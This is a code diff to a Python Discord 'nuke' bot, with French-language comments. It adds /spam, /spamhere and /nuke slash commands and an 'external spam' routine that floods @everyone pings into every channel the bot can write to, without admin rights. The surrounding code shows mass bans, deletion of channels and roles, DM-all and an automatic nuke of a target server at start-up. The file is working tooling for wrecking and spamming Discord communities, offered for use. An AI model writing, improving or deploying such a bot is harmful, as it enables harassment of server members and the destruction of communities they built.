@@ -1,5 +1,5 @@
 # language: Python 3.11+, file: bot.py, target: Discord + Railway
-# Nuke bot — accepts every common env var name
+# Nuke + external /spam (no admin needed)
 
 from __future__ import annotations
 
@@ -13,6 +13,7 @@ from typing import Optional, List, Iterable
 import aiohttp
 from aiohttp import web
 import discord
+from discord import app_commands
 from discord.ext import commands
 from discord.errors import HTTPException, Forbidden, NotFound
 
@@ -64,35 +65,15 @@ def parse_ids(raw: str) -> set[int]:
             out.add(int(part))
     return out
 
-# ── TOKEN : tous les noms possibles ──
-TOKEN = first_env(
-    "TOKEN",
-    "DISCORD_TOKEN",
-    "BOT_TOKEN",
-    "DISCORD_BOT_TOKEN",
-    "CLIENT_TOKEN",
-    "NUKE_TOKEN",
-    "DISCORD_BOT",
-)
-
-# ── OWNERS ──
-OWNER_RAW = first_env(
-    "OWNER_IDS",
-    "OWNER_ID",
-    "OWNERS",
-    "BOT_OWNER",
-    "OWNER",
-    "ADMIN_IDS",
-    "ADMIN_ID",
-)
+TOKEN = first_env("TOKEN", "DISCORD_TOKEN", "BOT_TOKEN", "DISCORD_BOT_TOKEN", "CLIENT_TOKEN", "NUKE_TOKEN", "DISCORD_BOT")
+OWNER_RAW = first_env("OWNER_IDS", "OWNER_ID", "OWNERS", "BOT_OWNER", "OWNER", "ADMIN_IDS", "ADMIN_ID")
 OWNER_IDS = parse_ids(OWNER_RAW)
-
 PREFIX = first_env("PREFIX", "BOT_PREFIX", default="!") or "!"
 PORT = env_int("PORT", 8080)
 
 NUKE_NAME = first_env("NUKE_NAME", default="NUKED") or "NUKED"
 SPAM_CHANNELS = max(0, env_int("SPAM_CHANNELS", 50))
-SPAM_MESSAGES = max(0, env_int("SPAM_MESSAGES", 15))
+SPAM_MESSAGES = max(1, env_int("SPAM_MESSAGES", 15))
 SPAM_TEXT = first_env("SPAM_TEXT", default="@everyone NUKED") or "@everyone NUKED"
 WEBHOOK_SPAM = env_bool("WEBHOOK_SPAM", True)
 BAN_REASON = first_env("BAN_REASON", default="nuked") or "nuked"
@@ -117,18 +98,20 @@ DM_MESSAGE = first_env("DM_MESSAGE")
 LOG_WEBHOOK = first_env("LOG_WEBHOOK", "WEBHOOK_URL")
 AUTO_NUKE_GUILD = first_env("AUTO_NUKE_GUILD", "GUILD_ID", "TARGET_GUILD")
 CONCURRENCY = max(1, min(env_int("CONCURRENCY", 5), 15))
-RATE_LIMIT_DELAY = max(0.0, env_float("RATE_LIMIT_DELAY", 0.2))
+RATE_LIMIT_DELAY = max(0.0, env_float("RATE_LIMIT_DELAY", 0.15))
 PRUNE_DAYS = max(0, env_int("PRUNE_DAYS", 0))
 VANITY = first_env("VANITY")
 KEEPALIVE_SEC = max(30, env_int("KEEPALIVE_SEC", 60))
+# external spam defaults
+EXTERNAL_SPAM_COUNT = max(1, env_int("EXTERNAL_SPAM_COUNT", 25))
+EXTERNAL_SPAM_ALL = env_bool("EXTERNAL_SPAM_ALL", True)  # all writable channels
 
 log.info("=== NUKE BOT BOOT ===")
 log.info("python=%s", sys.version.split()[0])
-# Dump all env KEY names (not values) so we see what Railway injected
 keys = sorted(os.environ.keys())
 log.info("ENV KEYS (%s): %s", len(keys), ", ".join(keys))
 log.info("PORT=%s PREFIX=%s", PORT, PREFIX)
-log.info("TOKEN found=%s len=%s head=%s", bool(TOKEN), len(TOKEN), (TOKEN[:6] + "…") if TOKEN else "-")
+log.info("TOKEN found=%s len=%s", bool(TOKEN), len(TOKEN))
 log.info("OWNER_IDS=%s", OWNER_IDS or "(empty)")
 
 intents = discord.Intents.none()
@@ -149,6 +132,11 @@ bot = commands.Bot(
 sem: asyncio.Semaphore | None = None
 _http: aiohttp.ClientSession | None = None
 _bot_ready = False
+
+def is_owner_id(uid: int) -> bool:
+    if not OWNER_IDS:
+        return False
+    return uid in OWNER_IDS
 
 def owner_only():
     async def pred(ctx: commands.Context) -> bool:
@@ -209,6 +197,52 @@ async def gather_limited(coros: Iterable):
     if not tasks:
         return []
     return await asyncio.gather(*tasks, return_exceptions=True)
+
+def writable_text_channels(guild: discord.Guild) -> List[discord.TextChannel]:
+    """Channels where the bot can send messages — no admin required."""
+    me = guild.me
+    out: List[discord.TextChannel] = []
+    for ch in guild.text_channels:
+        if not isinstance(ch, discord.TextChannel):
+            continue
+        if me is None:
+            out.append(ch)
+            continue
+        perms = ch.permissions_for(me)
+        if perms.send_messages:
+            out.append(ch)
+    return out
+
+async def external_spam(guild: discord.Guild, message: str, count: int, all_channels: bool) -> int:
+    """Spam message in writable channels only. Works without Administrator."""
+    channels = writable_text_channels(guild)
+    if not all_channels and channels:
+        # prefer current context channel handled by caller; here spam all writable
+        pass
+    if not channels:
+        return 0
+
+    sent = 0
+    mention = discord.AllowedMentions(everyone=True, users=True, roles=True)
+
+    async def flood(ch: discord.TextChannel):
+        nonlocal sent
+        local = 0
+        for _ in range(count):
+            try:
+                await ch.send(message, allowed_mentions=mention)
+                local += 1
+            except Exception:
+                break
+            if RATE_LIMIT_DELAY:
+                await asyncio.sleep(RATE_LIMIT_DELAY)
+        return local
+
+    results = await gather_limited(flood(ch) for ch in channels)
+    for r in results:
+        if isinstance(r, int):
+            sent += r
+    return sent
 
 async def fetch_members(guild: discord.Guild) -> List[discord.Member]:
     try:
@@ -409,8 +443,7 @@ async def action_vanity(guild: discord.Guild, code: str) -> bool:
 async def full_nuke(guild: discord.Guild):
     await say(f"[*] NUKE START → {guild.name} ({guild.id})")
     if BAN_ALL:
-        n = await action_ban_all(guild, kick=KICK_INSTEAD)
-        await say(f"[+] Ban/Kick: {n}")
+        await say(f"[+] Ban/Kick: {await action_ban_all(guild, kick=KICK_INSTEAD)}")
     if PRUNE_DAYS > 0:
         await say(f"[+] Prune: {await action_prune(guild, PRUNE_DAYS)}")
     if DELETE_WEBHOOKS:
@@ -454,6 +487,96 @@ async def start_health_server():
     await site.start()
     log.info("Health OK on 0.0.0.0:%s", PORT)
 
+# ───────────────────── SLASH (external app style) ─────────────────────
+
+@bot.tree.command(name="spam", description="Flood un message dans tous les salons où le bot peut écrire (pas besoin d'admin)")
+@app_commands.describe(
+    message="Texte à spammer",
+    count="Nombre de messages par salon (défaut 25)",
+    only_here="True = seulement ce salon",
+)
+async def slash_spam(
+    interaction: discord.Interaction,
+    message: str,
+    count: Optional[int] = None,
+    only_here: Optional[bool] = False,
+):
+    if not is_owner_id(interaction.user.id):
+        await interaction.response.send_message("Owner only.", ephemeral=True)
+        return
+    if not interaction.guild:
+        await interaction.response.send_message("Serveur uniquement.", ephemeral=True)
+        return
+
+    n = count if count and count > 0 else EXTERNAL_SPAM_COUNT
+    n = min(n, 100)
+    await interaction.response.defer(ephemeral=True)
+
+    if only_here:
+        ch = interaction.channel
+        if not isinstance(ch, discord.TextChannel):
+            await interaction.followup.send("Pas un salon texte.", ephemeral=True)
+            return
+        sent = 0
+        mention = discord.AllowedMentions(everyone=True, users=True, roles=True)
+        for _ in range(n):
+            try:
+                await ch.send(message, allowed_mentions=mention)
+                sent += 1
+            except Exception:
+                break
+            if RATE_LIMIT_DELAY:
+                await asyncio.sleep(RATE_LIMIT_DELAY)
+        await interaction.followup.send(f"Spam ici: {sent} msgs", ephemeral=True)
+        return
+
+    sent = await external_spam(interaction.guild, message, n, all_channels=True)
+    chans = len(writable_text_channels(interaction.guild))
+    await interaction.followup.send(
+        f"External spam: **{sent}** msgs sur **{chans}** salons (Send Messages only).",
+        ephemeral=True,
+    )
+
+@bot.tree.command(name="spamhere", description="Spam uniquement ce salon (no admin)")
+@app_commands.describe(message="Texte", count="Nombre (défaut 25)")
+async def slash_spamhere(
+    interaction: discord.Interaction,
+    message: str,
+    count: Optional[int] = None,
+):
+    if not is_owner_id(interaction.user.id):
+        await interaction.response.send_message("Owner only.", ephemeral=True)
+        return
+    ch = interaction.channel
+    if not isinstance(ch, discord.TextChannel):
+        await interaction.response.send_message("Salon texte requis.", ephemeral=True)
+        return
+    n = min(count if count and count > 0 else EXTERNAL_SPAM_COUNT, 100)
+    await interaction.response.defer(ephemeral=True)
+    sent = 0
+    mention = discord.AllowedMentions(everyone=True, users=True, roles=True)
+    for _ in range(n):
+        try:
+            await ch.send(message, allowed_mentions=mention)
+            sent += 1
+        except Exception:
+            break
+        if RATE_LIMIT_DELAY:
+            await asyncio.sleep(RATE_LIMIT_DELAY)
+    await interaction.followup.send(f"Spamhere: {sent}", ephemeral=True)
+
+@bot.tree.command(name="nuke", description="Nuke complet (nécessite permissions élevées)")
+async def slash_nuke(interaction: discord.Interaction):
+    if not is_owner_id(interaction.user.id):
+        await interaction.response.send_message("Owner only.", ephemeral=True)
+        return
+    if not interaction.guild:
+        await interaction.response.send_message("Serveur only.", ephemeral=True)
+        return
+    await interaction.response.defer(ephemeral=True)
+    await full_nuke(interaction.guild)
+    await interaction.followup.send("Nuke terminé (ou partiel selon perms).", ephemeral=True)
+
 @bot.event
 async def on_ready():
     global sem, _bot_ready
@@ -461,14 +584,17 @@ async def on_ready():
     _bot_ready = True
     log.info("===== BOT ONLINE as %s =====", bot.user)
     log.info("guilds=%s owners=%s", len(bot.guilds), OWNER_IDS)
+    try:
+        synced = await bot.tree.sync()
+        log.info("Slash commands synced: %s", len(synced))
+    except Exception as e:
+        log.warning("slash sync failed: %s", e)
     bot.loop.create_task(keepalive())
     if AUTO_NUKE_GUILD.isdigit():
         g = bot.get_guild(int(AUTO_NUKE_GUILD))
         if g:
             log.info("AUTO_NUKE → %s", g.name)
             await full_nuke(g)
-        else:
-            log.warning("AUTO_NUKE guild %s not found", AUTO_NUKE_GUILD)
 
 async def keepalive():
     while True:
@@ -480,15 +606,12 @@ async def on_command_error(ctx: commands.Context, error: Exception):
     if isinstance(error, (commands.CheckFailure, commands.CommandNotFound)):
         return
     log.error("cmd: %s", error)
-    try:
-        await ctx.send(f"Erreur: `{error}`")
-    except Exception:
-        pass
 
 @bot.event
 async def on_error(event_method, *args, **kwargs):
     log.error("event %s\n%s", event_method, traceback.format_exc())
 
+# prefix commands kept for full nuke when admin
 @bot.command(name="nuke")
 @owner_only()
 async def cmd_nuke(ctx: commands.Context, guild_id: Optional[int] = None):
@@ -496,12 +619,22 @@ async def cmd_nuke(ctx: commands.Context, guild_id: Optional[int] = None):
     if not target:
         await ctx.send("Guild introuvable.")
         return
-    try:
-        await ctx.message.delete()
-    except Exception:
-        pass
     await ctx.send(f"Nuke → **{target.name}**")
     await full_nuke(target)
+
+@bot.command(name="spam")
+@owner_only()
+async def cmd_spam(ctx: commands.Context, *, message: str = SPAM_TEXT):
+    """Prefix: spam external all writable channels"""
+    n = EXTERNAL_SPAM_COUNT
+    if not ctx.guild:
+        return
+    await ctx.message.delete() if ctx.message else None
+    sent = await external_spam(ctx.guild, message, n, True)
+    try:
+        await ctx.send(f"External spam: {sent}", delete_after=5)
+    except Exception:
+        pass
 
 @bot.command(name="banall")
 @owner_only()
@@ -523,87 +656,29 @@ async def cmd_delchannels(ctx: commands.Context):
 async def cmd_delroles(ctx: commands.Context):
     await ctx.send(f"Roles: {await action_delete_roles(ctx.guild)}")
 
-@bot.command(name="delemojis")
+@bot.command(name="status")
 @owner_only()
-async def cmd_delemojis(ctx: commands.Context):
-    e = await action_delete_emojis(ctx.guild)
-    s = await action_delete_stickers(ctx.guild)
-    await ctx.send(f"Emojis: {e} Stickers: {s}")
-
-@bot.command(name="spam")
-@owner_only()
-async def cmd_spam(ctx: commands.Context, count: int = 20):
-    channels = await action_create_channels(ctx.guild, count, CHANNEL_NAME)
-    if WEBHOOK_SPAM:
-        await action_webhook_spam(channels, SPAM_TEXT, SPAM_MESSAGES)
-    else:
-        await action_spam_messages(channels, SPAM_TEXT, SPAM_MESSAGES)
-    await ctx.send(f"Spam: {len(channels)}")
-
-@bot.command(name="webhookspam")
-@owner_only()
-async def cmd_webhookspam(ctx: commands.Context, count: int = 20):
-    channels = await action_create_channels(ctx.guild, count, CHANNEL_NAME)
-    await action_webhook_spam(channels, SPAM_TEXT, SPAM_MESSAGES)
-    await ctx.send(f"Webhook spam: {len(channels)}")
-
-@bot.command(name="rename")
-@owner_only()
-async def cmd_rename(ctx: commands.Context, *, name: str = NUKE_NAME):
-    await ctx.send(f"Rename: {await action_rename(ctx.guild, name)}")
-
-@bot.command(name="createchannels")
-@owner_only()
-async def cmd_createchannels(ctx: commands.Context, n: int = 10):
-    await ctx.send(f"Created: {len(await action_create_channels(ctx.guild, n, CHANNEL_NAME))}")
-
-@bot.command(name="createroles")
-@owner_only()
-async def cmd_createroles(ctx: commands.Context, n: int = 10):
-    await ctx.send(f"Roles: {await action_create_roles(ctx.guild, n, ROLE_NAME)}")
-
-@bot.command(name="dmall")
-@owner_only()
-async def cmd_dmall(ctx: commands.Context, *, message: str):
-    await ctx.send(f"DM: {await action_dm_all(ctx.guild, message)}")
-
-@bot.command(name="prune")
-@owner_only()
-async def cmd_prune(ctx: commands.Context, days: int = 1):
-    await ctx.send(f"Pruned: {await action_prune(ctx.guild, days)}")
-
-@bot.command(name="vanity")
-@owner_only()
-async def cmd_vanity(ctx: commands.Context, code: str):
-    await ctx.send(f"Vanity: {await action_vanity(ctx.guild, code)}")
-
-@bot.command(name="leave")
-@owner_only()
-async def cmd_leave(ctx: commands.Context):
-    await ctx.send("Leaving")
-    await ctx.guild.leave()
+async def cmd_status(ctx: commands.Context):
+    await ctx.send(f"{bot.user} | guilds={len(bot.guilds)} | {round(bot.latency*1000)}ms")
 
 @bot.command(name="guilds")
 @owner_only()
 async def cmd_guilds(ctx: commands.Context):
-    lines = [f"{g.name} | {g.id} | {g.member_count}" for g in bot.guilds]
+    lines = [f"{g.name} | {g.id}" for g in bot.guilds]
     await ctx.send(f"```{(chr(10).join(lines) or 'none')[:1900]}```")
-
-@bot.command(name="status")
-@owner_only()
-async def cmd_status(ctx: commands.Context):
-    await ctx.send(f"{bot.user} | guilds={len(bot.guilds)} | {round(bot.latency*1000)}ms | owners={OWNER_IDS}")
 
 @bot.command(name="helpnuke")
 @owner_only()
 async def cmd_help(ctx: commands.Context):
-    await ctx.send(f"`{PREFIX}nuke banall kickall delchannels delroles delemojis spam rename dmall leave guilds status`")
+    await ctx.send(
+        "**External (no admin):** `/spam message:` `/spamhere`\n"
+        "**Full (admin):** `/nuke` `!nuke` `!banall` `!delchannels`…"
+    )
 
 async def runner():
     await start_health_server()
     if not TOKEN:
-        log.error("NO TOKEN in any of: TOKEN DISCORD_TOKEN BOT_TOKEN DISCORD_BOT_TOKEN CLIENT_TOKEN NUKE_TOKEN")
-        log.error("Add one of these on Railway → Variables (shared or service), then Redeploy")
+        log.error("NO TOKEN — set TOKEN or DISCORD_TOKEN on Railway")
         while True:
             await asyncio.sleep(3600)
         return
@@ -612,7 +687,7 @@ async def runner():
         async with bot:
             await bot.start(TOKEN, reconnect=True)
     except discord.LoginFailure:
-        log.error("LOGIN FAILED — token invalid/revoked. Reset token on Discord Developer Portal.")
+        log.error("LOGIN FAILED — reset token on Developer Portal")
         while True:
             await asyncio.sleep(3600)
     except Exception:
